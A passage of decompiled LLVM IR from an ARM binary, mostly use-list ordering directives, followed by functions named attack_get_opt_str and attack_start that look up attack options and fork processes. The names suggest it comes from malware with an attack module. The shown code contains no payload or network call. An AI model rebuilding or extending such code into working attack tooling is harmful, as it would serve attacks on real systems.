  uselistorder i32 %v2_99b4, { 1, 0, 2 }
  uselistorder i32 %v4_99ac, { 2, 1, 0, 3 }
  uselistorder i32 %v0_98d4, { 1, 0 }
  uselistorder i32 %v0_9898, { 1, 0 }
  uselistorder i32 %v0_9d74, { 1, 0 }
  uselistorder i1 %v7_9854, { 1, 0 }
  uselistorder i32 %v0_983c, { 1, 0 }
  uselistorder i32 %v2_982c, { 1, 0, 2 }
  uselistorder i32 %v1_97f8, { 1, 0 }
  uselistorder i32 %v0_97f8, { 1, 2, 0, 3 }
  uselistorder i1 %v7_9790, { 1, 0 }
  uselistorder i32 %v5_978c, { 1, 2, 6, 4, 5, 3, 0, 7, 8 }
  uselistorder i32 %v2_9774.v4_975c, { 1, 0, 2 }
  uselistorder i1 %v7_9738, { 1, 0 }
  uselistorder i32 %v1_9618, { 1, 0, 2 }
  uselistorder i32 %v1_9610, { 1, 0 }
  uselistorder i1 %v7_95f8, { 1, 0 }
  uselistorder i32 %v5_95f4, { 1, 2, 5, 3, 4, 0, 6, 7 }
  uselistorder i32 %v2_95dc.v4_95c4, { 1, 0, 2 }
  uselistorder i1 %v7_95a4, { 1, 0 }
  uselistorder i32 %v0_950c, { 1, 0 }
  uselistorder i32 %v0_94f4, { 1, 0 }
  uselistorder i32 %v0_94f8, { 1, 0 }
  uselistorder i32 %v1_94d0, { 2, 3, 1, 0, 4, 5, 6 }
  uselistorder i32 %v0_949c, { 1, 0 }
  uselistorder i1 %v7_9464, { 0, 2, 1 }
  uselistorder i32 %v1_9488, { 1, 0 }
  uselistorder i32 %v3_9480, { 0, 1, 3, 2, 4, 5, 6 }
  uselistorder i32 %v0_9474, { 1, 0 }
  uselistorder i1 %v7_93e8, { 1, 0 }
  uselistorder i32 %v5_93e4, { 1, 5, 3, 4, 2, 0, 6, 7 }
  uselistorder i32 %v2_93cc, { 1, 0, 2 }
  uselistorder i32 %v2_93c8, { 1, 0, 2 }
  uselistorder i32 %v1_93b4, { 0, 2, 1 }
  uselistorder i32 %v4_93ac, { 1, 2, 0, 3 }
  uselistorder i1 %v7_937c, { 1, 0 }
  uselistorder i1 %v7_9314, { 1, 0 }
  uselistorder i32 %v5_9310, { 1, 2, 5, 3, 4, 0, 6, 7 }
  uselistorder i32 %v2_92f8.v4_92e0, { 1, 0, 2 }
  uselistorder i1 %v7_92b0, { 1, 0 }
  uselistorder i1 %v7_923c, { 1, 0 }
  uselistorder i32 %v5_9238, { 1, 2, 5, 3, 4, 0, 6, 7 }
  uselistorder i32 %v2_9220.v4_9208, { 1, 0, 2 }
  uselistorder i1 %v7_91e4, { 1, 0 }
  uselistorder i1 %v7_9164, { 1, 0 }
  uselistorder i32 %v5_9160, { 1, 2, 5, 3, 4, 0, 6, 7 }
  uselistorder i32 %v2_9148.v4_9130, { 1, 0, 2 }
  uselistorder i1 %v7_9110, { 1, 0 }
  uselistorder i1 %v7_90e4, { 1, 0 }
  uselistorder i1 %v7_90bc, { 1, 0 }
  uselistorder i32 %v0_9078, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v4_9048, { 2, 1, 0, 3, 4, 5 }
  uselistorder i32 %v2_8fe0, { 1, 0 }
  uselistorder i32 %v2_8fd4, { 1, 0 }
  uselistorder i32 %v1_8fd4, { 2, 0, 1, 3 }
  uselistorder i32 %v1_8fc8, { 1, 0 }
  uselistorder i32 %v3_8fac, { 5, 2, 3, 6, 4, 1, 0, 7 }
  uselistorder i32 %v2_8f8c, { 1, 0 }
  uselistorder i32 %v2_8f80, { 1, 0 }
  uselistorder i32 %v1_8f80, { 2, 0, 1, 3 }
  uselistorder i32 %v1_8f74, { 1, 0 }
  uselistorder i32 %v3_8f58, { 5, 2, 3, 6, 4, 1, 0, 7 }
  uselistorder i1 %v7_8f14, { 1, 0 }
  uselistorder i32 %v5_8ef0, { 1, 2, 3, 0 }
  uselistorder i1 %v7_8ed8, { 1, 0 }
  uselistorder i32 %v3_8ebc, { 1, 0 }
  uselistorder i32 %v0_8e78, { 1, 0 }
  uselistorder i32 %v3_8e44, { 4, 5, 6, 3, 1, 2, 0 }
  uselistorder i32* %v2_8e44, { 1, 0 }
  uselistorder i32 %v0_8e44, { 1, 0 }
  uselistorder i32 %v3_8e2c, { 1, 0, 2 }
  uselistorder i32 %v0_8e20, { 1, 2, 0 }
  uselistorder i32 %storemerge49, { 1, 0 }
  uselistorder i1 %v7_8d9c, { 1, 0 }
  uselistorder i32 %v4_8d90, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_8d60, { 1, 0 }
  uselistorder i32 %v2_8d50, { 1, 0 }
  uselistorder i32 %v2_8d44, { 1, 0 }
  uselistorder i32 %v1_8d44, { 2, 0, 1, 3 }
  uselistorder i32 %v1_8d38, { 1, 0 }
  uselistorder i32 %v3_8d1c, { 5, 2, 3, 6, 4, 1, 0, 7 }
  uselistorder i32 %v3_8d00, { 0, 2, 1 }
  uselistorder i32 %v2_8cd8, { 1, 0 }
  uselistorder i32 %v1_8cd8, { 2, 0, 1, 3 }
  uselistorder i32 %v0_8cd8, { 2, 4, 0, 1, 3, 5 }
  uselistorder i32 %v1_8cc4, { 1, 0 }
  uselistorder i32 %v3_8ca4, { 1, 0, 2 }
  uselistorder i32 %v1_8c08, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_8aac, { 1, 0 }
  uselistorder i32 %v3_888c, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v1_8838, { 2, 1, 0, 3 }
  uselistorder i32 %v3_8834, { 1, 0 }
  uselistorder i32 %v3_8828, { 2, 0, 1 }
  uselistorder i1 %v7_8814, { 1, 0 }
  uselistorder i32 %v3_880c, { 3, 2, 1, 0, 4, 5 }
  uselistorder i1 %v7_87e4, { 1, 0 }
  uselistorder i1 %v7_87dc, { 1, 0 }
  uselistorder i32 %v3_87c0, { 1, 0 }
  uselistorder i32 %v1_87a0, { 0, 1, 3, 2 }
  uselistorder i32 %v0_87a0, { 0, 2, 1 }
  uselistorder i32 %v2_879c, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8788, { 1, 0, 2 }
  uselistorder i32 %v1_8748, { 1, 0 }
  uselistorder i32 %v2_8728, { 1, 0 }
  uselistorder i32 %v1_8728, { 2, 0, 1, 3 }
  uselistorder i32 %v1_871c, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i32 %v0_8728, { 4, 1, 2, 5, 3, 0 }
  uselistorder i32 %v3_870c, { 1, 0 }
  uselistorder i32 %v3_8700, { 1, 0, 2 }
  uselistorder i1 %v7_865c, { 1, 0 }
  uselistorder i32 %v3_8658, { 3, 2, 1, 0, 4, 5 }
  uselistorder i1 %v7_8634, { 1, 0 }
  uselistorder i32 %v4_860c, { 2, 1, 0 }
  uselistorder i8 %v3_860c, { 11, 12, 13, 14, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i8* %v2_860c, { 2, 0, 3, 1 }
  uselistorder i32 %v3_88b0, { 4, 2, 3, 1, 0, 5 }
  uselistorder i1 %v7_85d4, { 1, 0 }
  uselistorder i32 %v1_85d4, { 1, 0 }
  uselistorder i1 %v7_85cc, { 1, 0 }
  uselistorder i1 %v7_85c4, { 1, 0 }
  uselistorder i1 %v7_85bc, { 1, 0 }
  uselistorder i32 %v1_85bc, { 1, 0 }
  uselistorder i1 %v7_85b4, { 1, 0 }
  uselistorder i1 %v7_85ac, { 1, 0 }
  uselistorder i32 %v1_8590, { 1, 0, 2, 4, 3 }
  uselistorder i32 %v2_8530, { 3, 2, 0, 4, 1, 5, 6 }
  uselistorder i8* %v1_88f0, { 11, 10, 12, 8, 6, 7, 9, 0, 1, 2, 3, 4, 5, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26 }
  uselistorder i32 %v2_8710, { 0, 15, 1, 2, 3, 16, 4, 17, 5, 18, 6, 19, 7, 20, 8, 21, 22, 9, 23, 10, 13, 11, 14, 12, 24 }
  uselistorder i32 %v1_9e84, { 1, 0, 2 }
  uselistorder i32 %stack_var_-20860.0.ph, { 58, 59, 57, 0, 61, 60, 1, 56, 55, 2, 64, 63, 3, 68, 67, 4, 66, 65, 5, 62, 6, 79, 78, 7, 77, 76, 8, 75, 74, 9, 73, 72, 10, 71, 11, 70, 69, 12, 54, 53, 13, 52, 51, 14, 50, 49, 15, 48, 47, 16, 46, 45, 17, 44, 43, 18, 42, 19, 41, 40, 20, 39, 38, 21, 37, 36, 22, 35, 34, 23, 33, 24, 32, 31, 25, 30, 29, 26, 27, 28 }
  uselistorder i32 %stack_var_-20864.0.ph, { 1, 0 }
  uselistorder i32 %v3_850c, { 1, 0 }
  uselistorder i32 %v0_850c, { 1, 0, 2 }
  uselistorder i32 %v2_84d8, { 1, 0, 2, 3 }
  uselistorder i32 %v3_84cc, { 1, 0, 2 }
  uselistorder i32 %v0_84c0, { 1, 0 }
  uselistorder i32 %v5_84b8, { 1, 0 }
  uselistorder i32 %v0_8484, { 1, 2, 0, 3 }
  uselistorder i32 %v0_840c, { 5, 4, 1, 0, 3, 2 }
  uselistorder i32 %v0_83e0, { 1, 0 }
  uselistorder i32 %v2_83b0, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_839c, { 4, 5, 19, 15, 16, 17, 2, 3, 18, 0, 1, 14, 10, 11, 12, 13, 20, 8, 9, 7, 6 }
  uselistorder i32 %v0_8390, { 0, 1, 3, 2 }
  uselistorder i1 %v2_8320, { 1, 0, 2 }
  uselistorder i32* %v11_82f4, { 2, 0, 1, 3 }
  uselistorder i32 %v10_82f0, { 22, 21, 20, 12, 11, 18, 17, 16, 19, 15, 14, 33, 32, 31, 29, 28, 30, 27, 26, 13, 24, 23, 10, 9, 8, 25, 7, 39, 38, 37, 35, 36, 34, 44, 43, 42, 41, 40, 6, 5, 4, 3, 2, 1, 0, 45, 46 }
  uselistorder i32 %v2_82e8, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v2_82d8, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v2_82c8, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v0_82a0, { 1, 0, 2 }
  uselistorder i8* %tmp168, { 5, 6, 4, 7, 3, 8, 2, 9, 1, 10, 11, 12, 0 }
  uselistorder i32 %v2_827c, { 0, 29, 35, 36, 37, 38, 1, 32, 2, 3, 33, 34, 39, 17, 18, 4, 28, 5, 6, 30, 31, 40, 7, 26, 8, 27, 9, 41, 10, 11, 24, 25, 42, 12, 21, 13, 22, 23, 43, 14, 15, 19, 20, 44, 45, 46, 16, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56 }
  uselistorder i32 %v5_8274, { 1, 0 }
  uselistorder i32 %v6_81fc, { 3, 2, 4, 0, 8, 7, 6, 1, 5, 9 }
  uselistorder i32* %stack_var_-44, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 0, 35, 36, 37, 38, 39, 42, 40, 41 }
  uselistorder i32* %sb.global-to-local, { 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 11, 28, 29, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 30, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 7, 4, 5, 6, 8, 9, 10, 11, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 4, 5, 6, 7, 8, 9, 10, 11, 159, 12, 13, 15, 14, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 92, 38, 39, 41, 42, 43, 45, 44, 46, 47, 48, 49, 50, 40, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 147, 148, 149, 150, 154, 155, 151, 152, 153, 156, 157, 158, 116, 117, 118, 119, 120, 121, 122, 124, 123, 3, 126, 127, 125, 2, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 42, 41, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 117, 118, 120, 121, 119, 122, 123, 125, 124, 93, 94, 95, 96, 97, 98, 3, 99, 100, 2, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 4, 5, 6, 7, 10, 8, 9, 11, 39, 26, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 59, 57, 58, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 74, 72, 73, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 166, 140, 167, 168, 169, 170, 171, 172, 173, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 1, 155, 156, 157, 158, 159, 160, 161, 162, 163, 165, 164, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 2, 4, 5, 7, 6, 8, 9, 10, 11, 12, 13, 17, 15, 14, 16, 227, 18, 133, 208, 58, 29, 19, 21, 20, 22, 25, 24, 27, 26, 30, 28, 31, 33, 32, 34, 36, 35, 38, 37, 42, 39, 40, 41, 43, 44, 46, 45, 48, 47, 49, 50, 51, 53, 52, 54, 55, 56, 59, 57, 61, 60, 62, 64, 63, 65, 68, 66, 67, 70, 69, 74, 71, 72, 73, 75, 77, 76, 79, 78, 80, 82, 81, 84, 83, 85, 86, 88, 87, 89, 90, 92, 91, 94, 93, 96, 95, 97, 99, 98, 100, 101, 102, 104, 103, 106, 105, 107, 109, 108, 110, 112, 111, 114, 113, 115, 117, 116, 118, 121, 119, 120, 123, 122, 125, 124, 126, 128, 127, 129, 131, 130, 134, 132, 135, 137, 136, 139, 138, 141, 140, 143, 142, 145, 144, 148, 146, 147, 150, 149, 151, 153, 152, 154, 157, 155, 156, 159, 158, 161, 160, 162, 164, 163, 165, 167, 166, 168, 169, 170, 172, 171, 174, 173, 175, 177, 176, 178, 180, 179, 181, 182, 183, 185, 184, 187, 186, 188, 190, 189, 191, 193, 192, 194, 196, 195, 197, 198, 200, 199, 202, 201, 205, 203, 204, 209, 206, 207, 212, 210, 211, 213, 215, 214, 216, 218, 217, 220, 219, 221, 222, 223, 225, 224, 229, 226, 228, 231, 230, 232, 234, 233, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 338, 339, 341, 340, 342, 343, 344, 287, 289, 288, 291, 290, 294, 293, 292, 298, 295, 296, 297, 23, 301, 299, 300, 302, 303, 304, 305, 306, 307, 1, 309, 308, 310, 311, 312, 314, 313, 315, 316, 317, 318, 319, 320, 321, 323, 322, 325, 324, 327, 326, 329, 328, 331, 330, 332, 333, 334, 335, 336, 337, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 50, 51, 52, 53, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49 }
  uselistorder i32* %fp.global-to-local, { 0, 34, 1, 3, 2, 4, 5, 6, 7, 28, 27, 31, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 29, 30, 32, 33, 35, 36 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 10, 9, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 24, 23, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 57, 56, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 101, 94, 95, 96, 97, 98, 99, 100, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 139, 140, 141, 142, 147, 149, 148, 143, 144, 145, 146, 150, 151, 152, 153, 114, 115, 123, 124, 116, 117, 118, 119, 120, 121, 122, 125, 0, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138 }
  uselistorder i1* %cpsr_c.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 28, 27, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 62, 63, 61, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 106, 100, 101, 102, 103, 104, 105, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 152, 153, 158, 160, 159, 154, 155, 156, 157, 161, 162, 163, 164, 165, 121, 122, 123, 131, 132, 124, 125, 126, 127, 128, 129, 130, 133, 0, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151 }
  uselistorder i32 49, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 51, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 50, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 ptrtoint (i32* @global_var_1b424.59 to i32), { 1, 2, 0, 3 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_1b414.55 to i32), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_1b40c.53 to i32), { 1, 2, 0, 3 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_1b400.51 to i32), { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 -20773, { 1, 0, 2, 4, 3, 8, 5, 6, 7 }
  uselistorder i32 ptrtoint (i32* @global_var_1b408.49 to i32), { 2, 4, 3, 5, 1, 6, 0, 7 }
  uselistorder i32 2116, { 1, 2, 0 }
  uselistorder i32 35, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 ptrtoint (i32* @global_var_1b3e0.37 to i32), { 0, 2, 1, 3 }
  uselistorder i32 -1452, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 0, 23, 24 }
  uselistorder i32 1452, { 1, 0 }
  uselistorder i32 789, { 2, 0, 1, 3 }
  uselistorder i32 1431, { 1, 2, 0, 3 }
  uselistorder i32 533, { 1, 0, 3, 2, 4 }
  uselistorder i32 3140, { 3, 1, 0, 2, 4, 5 }
  uselistorder i32 43, { 0, 2, 1, 3 }
  uselistorder i32 37, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 ptrtoint ([4 x i8]* @global_var_1b3e8.30 to i32), { 0, 2, 3, 1, 4 }
  uselistorder i32 %arg4, { 1, 0, 2, 3 }
  uselistorder i32 %arg3, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_9e44, { 1, 2, 3, 4, 5, 0 }
  uselistorder label %dec_label_pc_9d08, { 2, 0, 1 }
  uselistorder label %dec_label_pc_9ce8, { 2, 0, 1 }
  uselistorder label %.thread47, { 1, 0 }
  uselistorder label %dec_label_pc_9ab4, { 1, 0 }
  uselistorder label %.thread44, { 1, 0 }
  uselistorder label %dec_label_pc_9a88, { 2, 0, 1 }
  uselistorder label %.thread41, { 1, 0 }
  uselistorder label %dec_label_pc_99ec, { 2, 1, 0 }
  uselistorder label %dec_label_pc_9918, { 5, 0, 1, 6, 2, 3, 4 }
  uselistorder label %dec_label_pc_98cc, { 1, 0 }
  uselistorder label %dec_label_pc_98a4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_9898, { 1, 0 }
  uselistorder label %.thread37, { 1, 0 }
  uselistorder label %bb203, { 1, 0 }
  uselistorder label %dec_label_pc_9654, { 6, 1, 2, 7, 3, 4, 0, 5 }
  uselistorder label %bb201, { 1, 0 }
  uselistorder label %dec_label_pc_9550, { 0, 2, 1 }
  uselistorder label %dec_label_pc_94a4, { 1, 0 }
  uselistorder label %dec_label_pc_949c, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_9474, { 1, 0 }
  uselistorder label %dec_label_pc_9438, { 1, 0 }
  uselistorder label %bb197, { 1, 0 }
  uselistorder label %bb195, { 1, 0 }
  uselistorder label %bb193, { 1, 0 }
  uselistorder label %dec_label_pc_934c, { 2, 1, 0 }
  uselistorder label %bb191, { 1, 0 }
  uselistorder label %.thread26, { 3, 0, 1, 2 }
  uselistorder label %bb188, { 1, 0 }
  uselistorder label %.thread25, { 3, 0, 1, 2 }
  uselistorder label %bb185, { 1, 0 }
  uselistorder label %.thread24, { 1, 0 }
  uselistorder label %.thread23, { 1, 0 }
  uselistorder label %dec_label_pc_9080, { 1, 0 }
  uselistorder label %dec_label_pc_8f38, { 1, 0 }
  uselistorder label %dec_label_pc_8e08, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_8de0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8d74, { 1, 2, 0 }
  uselistorder label %bb180, { 1, 0 }
  uselistorder label %dec_label_pc_8c84, { 1, 0 }
  uselistorder label %dec_label_pc_8c6c, { 1, 0 }
  uselistorder label %dec_label_pc_8c30, { 1, 0 }
  uselistorder label %dec_label_pc_8bbc, { 1, 0 }
  uselistorder label %dec_label_pc_8b84, { 1, 0 }
  uselistorder label %dec_label_pc_88bc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_87ec, { 7, 8, 9, 10, 11, 1, 12, 13, 2, 14, 15, 3, 16, 0, 6, 4, 5 }
  uselistorder label %dec_label_pc_87b4, { 1, 0 }
  uselistorder label %dec_label_pc_85f4, { 5, 0, 1, 2, 6, 4, 3, 7 }
  uselistorder label %dec_label_pc_8570.dec_label_pc_8570_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_8548.dec_label_pc_8548_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_852c, { 3, 0, 2, 1, 4 }
  uselistorder label %dec_label_pc_852c.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_84c0, { 1, 0 }
  uselistorder label %dec_label_pc_8444, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %bb174, { 1, 0 }
  uselistorder label %bb172, { 1, 0 }
  uselistorder label %dec_label_pc_82fc, { 1, 0 }
  uselistorder label %dec_label_pc_82b4, { 1, 3, 4, 0, 2 }
}

define i32 @attack_get_opt_str(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v2_9f60 = icmp eq i32 %arg1, 0
  br i1 %v2_9f60, label %dec_label_pc_9fa8, label %dec_label_pc_9f70

dec_label_pc_9f70:                                ; preds = %entry
  %v0_9f70 = load i32, i32* %r1.global-to-local, align 4
  %v1_9f70 = add i32 %v0_9f70, 4
  %v2_9f70 = inttoptr i32 %v1_9f70 to i8*
  %v3_9f70 = load i8, i8* %v2_9f70, align 1
  %v4_9f70 = zext i8 %v3_9f70 to i32
  %v9_9f74 = icmp eq i32 %v4_9f70, %arg3
  br i1 %v9_9f74, label %dec_label_pc_9fb4, label %dec_label_pc_9f98.preheader

dec_label_pc_9f98.preheader:                      ; preds = %dec_label_pc_9f70
  br label %dec_label_pc_9f98

dec_label_pc_9f88:                                ; preds = %dec_label_pc_9f98
  %v1_9f88 = add i32 %v0_9f90.in, 12
  %v2_9f88 = inttoptr i32 %v1_9f88 to i8*
  %v3_9f88 = load i8, i8* %v2_9f88, align 1
  %v4_9f88 = zext i8 %v3_9f88 to i32
  %v9_9f8c = icmp eq i32 %v4_9f88, %arg3
  br i1 %v9_9f8c, label %dec_label_pc_9fb4, label %dec_label_pc_9f98

dec_label_pc_9f98:                                ; preds = %dec_label_pc_9f98.preheader, %dec_label_pc_9f88
  %v0_9f90.in = phi i32 [ %v0_9f70, %dec_label_pc_9f98.preheader ], [ %v0_9f90, %dec_label_pc_9f88 ]
  %v0_9f98 = phi i32 [ 0, %dec_label_pc_9f98.preheader ], [ %v1_9f98, %dec_label_pc_9f88 ]
  %v0_9f90 = add i32 %v0_9f90.in, 8
  %v1_9f98 = add i32 %v0_9f98, 1
  %v9_9f9c = icmp eq i32 %v1_9f98, %arg1
  store i32 %v0_9f90, i32* %r1.global-to-local, align 4
  br i1 %v9_9f9c, label %dec_label_pc_9fa8, label %dec_label_pc_9f88

dec_label_pc_9fa8:                                ; preds = %dec_label_pc_9f98, %entry, %dec_label_pc_9fb4
  %v0_9fa8 = phi i32 [ %arg4, %entry ], [ %v2_9fb4, %dec_label_pc_9fb4 ], [ %arg4, %dec_label_pc_9f98 ]
  ret i32 %v0_9fa8

dec_label_pc_9fb4:                                ; preds = %dec_label_pc_9f88, %dec_label_pc_9f70
  %v0_9fb4 = phi i32 [ %v0_9f70, %dec_label_pc_9f70 ], [ %v0_9f90, %dec_label_pc_9f88 ]
  %v1_9fb4 = inttoptr i32 %v0_9fb4 to i32*
  %v2_9fb4 = load i32, i32* %v1_9fb4, align 4
  br label %dec_label_pc_9fa8

; uselistorder directives
  uselistorder i32 %v1_9f98, { 1, 0 }
  uselistorder i32 %v0_9f90, { 1, 0, 2 }
  uselistorder i32 %v0_9f90.in, { 1, 0 }
  uselistorder i32 %v0_9f70, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_9fa8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_9f98, { 1, 0 }
}

define i32 @attack_start(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i8 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_9fbc = load i32, i32* @r4, align 4
  store i32 %v3_9fbc, i32* %stack_var_-32, align 4
  %v6_9fbc = load i32, i32* @r5, align 4
  %v9_9fbc = load i32, i32* @r6, align 4
  %v12_9fbc = load i32, i32* @r7, align 4
  %v0_9fc0 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_9fc0, i32* @sb, align 4
  store i32 %arg1, i32* @r6, align 4
  store i32 %arg2, i32* @r7, align 4
  store i32 %arg3, i32* @sl, align 4
  %v4_9fd0 = sext i8 %arg5 to i32
  store i32 %v4_9fd0, i32* @r8, align 4
  %v0_9fd4 = call i32 @__libc_fork()
  %v7_9fd8 = icmp eq i32 %v0_9fd4, -1
  %. = zext i1 %v7_9fd8 to i32
  store i32 %., i32* %r3.global-to-local, align 4
  %tmp23 = icmp slt i32 %v0_9fd4, 1
  br i1 %tmp23, label %bb24, label %.thread2

.thread2:                                         ; preds = %entry
  br label %dec_label_pc_9ff8

bb24:                                             ; preds = %entry
  store i32 %., i32* @r5, align 4
  %v2_9ff0 = icmp eq i1 %v7_9fd8, false
  br i1 %v2_9ff0, label %dec_label_pc_a000, label %dec_label_pc_9ff8

dec_label_pc_9ff8:                                ; preds = %.thread2, %bb24
  %v2_9ff8 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_9ff8, i32* @r4, align 4
  store i32 %v6_9fbc, i32* @r5, align 4
  store i32 %v9_9fbc, i32* @r6, align 4
  store i32 %v12_9fbc, i32* @r7, align 4
  ret i32 %v0_9fd4

dec_label_pc_a000:                                ; preds = %bb24
  %v0_a000 = call i32 @__libc_fork()
  %v7_a004 = icmp eq i32 %v0_a000, -1
  store i32 %v0_a000, i32* @r4, align 4
  br i1 %v7_a004, label %dec_label_pc_a034, label %dec_label_pc_a010

dec_label_pc_a010:                                ; preds = %dec_label_pc_a000
